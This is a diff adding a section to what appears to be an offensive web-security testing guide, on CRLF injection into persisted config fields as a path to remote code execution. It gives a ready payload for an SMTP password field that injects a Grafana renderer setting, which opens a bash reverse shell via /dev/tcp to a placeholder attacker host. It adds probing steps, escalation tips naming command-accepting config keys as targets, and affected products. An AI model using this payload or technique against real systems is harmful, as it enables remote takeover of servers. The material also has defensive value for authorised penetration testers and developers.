@@ -211,6 +211,29 @@ If the app sets `X-Frame-Options`, `Content-Security-Policy`, or other security 
 ?param=value%0d%0aX-Frame-Options:%20ALLOWALL
 ```
 
+### 6.6 CRLF injection in persisted config field → config file injection → RCE
+
+When a user-supplied text field (e.g. SMTP password, server hostname, description) is written verbatim into an INI/TOML/config file on the server, CRLF characters in the value break out of the value and inject new config keys or sections:
+
+```
+# Input in SMTP password field:
+x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/ATTACKER/4444$IFS0<&1$IFS2>&1
+```
+
+The config file on disk becomes:
+```ini
+[smtp]
+password = x
+[plugin.grafana-image-renderer]
+rendering_args=--renderer-cmd-prefix=bash -c ...
+```
+
+**How to detect the vector:** Find any admin/config UI field whose value ends up in a config file (SMTP settings, plugin configuration, data source settings). Test with `x\r\nINJECTED_KEY=test` and check if an INJECTED_KEY shows up in any exported config or produces an error about an unexpected config key.
+
+**Escalation:** The injected config key doesn't have to be the same service — look for plugins or renderers loaded from the same config file. Fields like `rendering_args`, `exec_cmd`, `script_path` that accept system commands are ideal targets once you can inject into the right config section.
+
+**Broadly applicable to:** Grafana, Prometheus, any Go/Python/Ruby app that writes user config to disk in INI/TOML/YAML format without sanitizing newlines before write.
+
 ---
 
 ## 7. Bypass techniques
